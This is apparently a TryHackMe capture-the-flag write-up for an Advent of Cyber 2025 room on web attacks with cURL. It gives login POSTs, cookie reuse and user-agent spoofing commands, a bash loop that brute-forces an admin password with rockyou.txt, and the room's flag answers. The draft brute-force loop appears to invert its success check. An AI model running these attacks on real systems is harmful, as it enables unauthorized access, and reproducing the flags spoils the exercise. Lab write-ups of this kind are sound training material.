![Exploitation with cURL - Hoperation Eggsploit Banner](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/5f9c7574e201fe31dad228fc-1764173707337)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Cover.png" alt="Exploitation with cURL - Hoperation Eggsploit Logo">
</p>

# <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/5f9c7574e201fe31dad228fc-1764173598881" alt="image" style="vertical-align: middle;height: 50px;" /> Exploitation with cURL - Hoperation Eggsploit | Advent of Cyber 2025 - Day 24

This guide contains the answer and steps necessary to get to them for the [Exploitation with cURL - Hoperation Eggsploit](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0) room.

## Table of contents

- [Web Hacking Using cURL](#web-hacking-using-curl)

### Web Hacking Using cURL

1.  Make a POST request to the /post.php endpoint with the username admin and the password admin. What is the flag you receive?

    We will user the following command together with the received credentials. This should return the flag if successfull.

    ```cmd
    curl -X POST -d "username=admin&password=admin&submit=Login" http://10.80.184.173/post.php
    ```

    ![Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Flag1.png)

    ><details><summary>Click for answer</summary>THM{curl_post_success}</details>

2.  Make a request to the /cookie.php endpoint with the username admin and the password admin and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?

    We first add the `-c` value to our command to save the cookie.

    ```cmd
    curl -c cookie.txt -X POST -d "username=admin&password=admin&submit=Login" http://10.80.184.173/cookie.php
    ```

    Now we can send another request to the same endpoint using the cookie without login in again.

    ```cmd
    curl -b cookie.txt http://10.80.184.173/cookie.php
    ```

    ![Flag2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Flag2.png)

    ><details><summary>Click for answer</summary>THM{session_cookie_master}</details>

3.  After doing the brute force on the /bruteforce.php endpoint, what is the password of the admin user?

    Create a 'passwords.txt' file and add the provided passwords.

    ![Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Passwords.png)

    Now setup the script that was provided.

    ![Loop](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Loop.png)

    Give the script execution permissions and run it to get the password.

    ```cmd
    chmod +x loop.sh
    ./loop.sh
    ```

    ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Password.png)

    ><details><summary>Click for answer</summary>secretpass</details>

4.  Make a request to the /agent.php endpoint with the user-agent TBFC. What is the flag your receive?

    For this we can use a basic GET request. But we must add a custom user-agent.

    ```cmd
    curl -A "TBFC" http://10.80.184.173/agent.php
    ```

    ![Flag3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Flag3.png)

    ><details><summary>Click for answer</summary>THM{user_agent_filter_bypassed}</details>

5.  Bonus question: Can you solve the Final Mission and get the flag?

    Draft notes

    ```cmd
    curl -s -X POST -A "secretcomputer" -d "username=admin&password=$pass" http://10.82.157.146/terminal.php?action=panel
    curl -s -X POST -A "secretcomputer" -d "username=admin&password=$pass" http://10.82.157.146/terminal.php?action=login | grep "fail"
    ```


    ```cmd
    for pass in $(cat /usr/share/wordlists/rockyou.txt); do
    echo "Trying password: $pass"
    response=$(curl -s -X POST -A "secretcomputer" -d "username=admin&password=$pass" http://10.82.157.146/terminal.php?action=login)
    if echo "$response" | grep -q "fail"; then
        echo "[+] Password found: $pass"
        break
    fi
    done
    ```

    ![Bonus Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/webhackingusingcurl-aoc2025-w8q1a4s7d0/Exploitation_with_cURL_-_Hoperation_Eggsploit_Bonus_Password.png)

    ><details><summary>Click for answer</summary></details>
